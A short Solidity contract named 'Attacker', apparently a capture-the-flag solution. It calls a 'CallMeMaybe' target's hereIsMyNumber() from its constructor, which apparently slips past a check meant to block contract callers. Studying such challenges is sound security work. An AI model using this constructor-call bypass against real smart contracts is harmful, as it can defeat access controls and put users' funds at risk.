// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CallMeMaybe.sol";

contract Attacker {
    CallMeMaybe public target;

    constructor(address _target) {
        target = CallMeMaybe(_target);
        target.hereIsMyNumber();
    }
}
